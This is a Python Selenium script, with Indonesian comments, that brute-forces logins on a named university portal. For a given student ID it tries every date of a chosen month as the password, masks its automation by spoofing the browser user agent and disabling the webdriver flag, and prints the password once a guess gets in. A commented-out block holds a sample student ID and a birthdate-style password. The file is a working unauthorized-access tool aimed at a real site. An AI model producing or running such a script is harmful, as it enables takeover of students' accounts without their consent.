import datetime
import time
import calendar
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
# Input month and year
nim = str(input("NIM: "))
year = int(input("Masukkan tahun (YYYY): "))
month = int(input("Masukkan bulan (MM): "))

# Take total of days in month and year you gift
days_in_month = calendar.monthrange(year, month)[1]

# Generate list of dates from 1 to all of days in month
date_list = [datetime.date(year, month, day).strftime('%Y-%m-%d') for day in range(1, days_in_month+1)]
print("Generate list of Datetime...")

# chrome_options = Options()
firefox_options = Options()
# chrome_options.add_argument("--headless")
firefox_options.set_preference('general.useragent.override', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0')
firefox_options.set_preference("dom.webdriver.enabled", False)
firefox_options.set_preference("useAutomationExtension", False)
firefox_options.set_preference("headless", False)
# firefox_options.set_preference("javascript.enabled", False)
driver = webdriver.Firefox(options=firefox_options)
# driver = webdriver.Chrome(options=chrome_options)
# driver = webdriver.Chrome()
print("Starting attempt to {}".format(nim))
driver.get("http://lykan.bsi.ac.id/login.html")
for date in date_list:
    time.sleep(3)
    nip = driver.find_element(By.NAME, "nip")
    nip.send_keys(nim)
    pw = driver.find_element(By.NAME, "pwd")
    pw.send_keys(date)
    time.sleep(3)
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(2)
    # auto()
    # driver.switch_to.alert.accept()
    try:
        WebDriverWait(driver, 2).until(EC.alert_is_present())
        driver.switch_to.alert.accept()
        print("Trying again")
    except TimeoutException:
        print("Attempt Success!!!")
        if driver.current_url == "http://lykan.bsi.ac.id/beranda.html":
            print("Password for {} is {}".format(nim, date))
            driver.find_element(By.XPATH, "Logout")
            break
    # if driver.current_url == "http://lykan.bsi.ac.id/verifikasi.html":
    #     driver.get("http://lykan.bsi.ac.id/login.html")
    # elif driver.current_url == "http://lykan.bsi.ac.id/beranda.html":
    #     print("Password Dari NIM {} adalah {}".format(nim, date))
    #     break

    # if driver.current_url == "http://lykan.bsi.ac.id/beranda.html":
    #     print("Password Dari NIM {} adalah {}".format(nim, date))
    #     break
    # else:
    #     driver.get("http://lykan.bsi.ac.id/login.html")
    #     print(driver.current_url)
# Close the browser
driver.close()
print("Program Closed")
# Quit Browser
driver.quit()


# def auto(nim, date):
#     time.sleep(3)
#     nip = driver.find_element(By.NAME, "nip")
#     nip.send_keys(nim)
#     pw = driver.find_element(By.NAME, "pwd")
#     pw.send_keys(date)
#     time.sleep(3)
#     driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
#     time.sleep(2)

# driver = webdriver.Chrome()
# driver.maximize_window()
# # membuka halaman web yang ingin diakses
# driver.get("http://lykan.bsi.ac.id/login.html")

# # menemukan elemen teks dengan Name "nip" dan memasukkan teks "John Doe"
# nama_elem = driver.find_element_by_name("nip")
# nama_elem.send_keys("17211048")
#
# # menemukan elemen teks dengan ID "pwd" dan memasukkan teks "Jl. Sudirman No. 123"
# alamat_elem = driver.find_element_by_name("pwd")
# alamat_elem.send_keys("2004-02-03")
#
# # menemukan elemen tombol submit dengan ID "submit" dan mengkliknya
# submit_elem = driver.find_element_by_type("submit")
# submit_elem.click()
#
# time.sleep(2)
# getURL = driver.getCurrentUrl("http://lykan.bsi.ac.id/beranda.html")
# print(getURL)
